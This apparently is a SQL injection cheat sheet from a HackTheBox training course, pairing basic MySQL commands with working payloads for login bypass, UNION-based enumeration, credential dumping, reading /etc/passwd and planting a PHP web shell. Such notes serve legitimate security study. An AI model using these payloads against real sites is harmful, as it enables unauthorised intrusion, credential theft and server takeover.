# **SQL Injection**

## **1. MySQL Command Reference**

### **General MySQL Commands**

```sql
mysql -u root -h docker.hackthebox.eu -P 3306 -p       -- Login to MySQL
SHOW DATABASES;                                        -- List databases
USE users;                                             -- Switch database
```

---

## **2. Table Operations**

```sql
CREATE TABLE logins (id INT, ...);                    -- Create table
SHOW TABLES;                                          -- List tables
DESCRIBE logins;                                      -- Show table schema

INSERT INTO table_name VALUES (value1, ...);          -- Insert row
INSERT INTO table_name(column2, ...) VALUES (...);    -- Insert selective cols

UPDATE table_name SET column1=newvalue WHERE ...;     -- Update rows
DROP TABLE logins;                                    -- Delete table
```

---

## **3. Column Operations**

```sql
SELECT * FROM table_name;                              -- View all rows
SELECT column1, column2 FROM table_name;               -- View specific columns

ALTER TABLE logins ADD newColumn INT;                  -- Add column
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn; -- Rename column
ALTER TABLE logins MODIFY oldColumn DATE;              -- Change column type
ALTER TABLE logins DROP oldColumn;                     -- Remove column
```

---

## **4. Output Filtering & Sorting**

```sql
SELECT * FROM logins ORDER BY column_1;              -- Sort ascending
SELECT * FROM logins ORDER BY column_1 DESC;         -- Sort descending
SELECT * FROM logins LIMIT 2;                        -- First two rows
SELECT * FROM logins LIMIT 1, 2;                     -- Row 2-3
SELECT * FROM logins WHERE username LIKE 'admin%';   -- Pattern match
```

---

## **5. MySQL Operator Precedence**

1. `/`, `*`, `%`
2. `+`, `-`
3. Comparison operators (`=`, `>`, `<`, `LIKE`, etc.)
4. `NOT`
5. `AND`
6. `OR`

---

# **SQL Injection Techniques**

## **6. Authentication Bypass**

```sql
admin' or '1'='1
admin')-- -
admin' OR TRUE-- -
' OR '1'='1'#
```

---

## **7. UNION Injection**

### **Finding number of columns**

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
```

### **Testing UNION**

```sql
cn' UNION SELECT 1,2,3-- -
```

### **Extracting useful data**

```sql
cn' UNION SELECT 1,@@version,3,4-- -
```

### **Dumping table contents**

```sql
UNION SELECT username,2,3,4 FROM passwords-- -
```

---

## **8. Database Enumeration**

### **Fingerprint MySQL**

```sql
SELECT @@version;
SELECT SLEEP(5);              -- Boolean/time-based detection
```

### **Current DB**

```sql
cn' UNION SELECT 1, database(), 2, 3-- -
```

### **List all databases**

```sql
cn' UNION SELECT 1, schema_name, 3, 4 
FROM information_schema.schemata-- -
```

### **List tables in a DB**

```sql
cn' UNION SELECT 1, table_name, table_schema, 4 
FROM information_schema.tables WHERE table_schema='dev'-- -
```

### **List columns in a table**

```sql
cn' UNION SELECT 1, column_name, table_name, table_schema 
FROM information_schema.columns WHERE table_name='credentials'-- -
```

### **Dump credentials**

```sql
cn' UNION SELECT 1, username, password, 4 
FROM dev.credentials-- -
```

---

## **9. Privilege Enumeration**

### **Current user**

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

### **Check SUPER privileges**

```sql
cn' UNION SELECT 1, super_priv, 3, 4 
FROM mysql.user WHERE user='root'-- -
```

### **List grants**

```sql
cn' UNION SELECT 1, grantee, privilege_type, is_grantable 
FROM information_schema.user_privileges 
WHERE grantee="'root'@'localhost'"-- -
```

### **Find writable directories**

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 
FROM information_schema.global_variables 
WHERE variable_name='secure_file_priv'-- -
```

---

## **10. File Injection (LFI + RCE)**

### **Read files**

```sql
cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -
```

### **Write files**

```sql
SELECT 'file written successfully!' 
INTO OUTFILE '/var/www/html/proof.txt';
```

### **Upload a PHP web shell**

```sql
cn' UNION SELECT "", "<?php system($_REQUEST[0]); ?>", "", "" 
INTO OUTFILE '/var/www/html/shell.php'-- -
```
